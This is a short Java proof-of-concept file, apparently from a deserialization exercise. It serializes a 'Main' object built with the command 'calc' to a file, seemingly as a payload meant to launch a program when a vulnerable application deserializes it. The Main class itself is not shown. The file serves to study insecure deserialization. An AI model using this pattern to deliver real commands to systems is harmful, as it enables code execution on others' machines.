package unserialize_one;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class POC {

	public static void main(String[] args) throws IOException {
		// TODO Auto-generated method stub
		Main m = new Main("calc");
		
		ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream("D:\\foo.ser"));
        o.writeObject(m);
	}

}
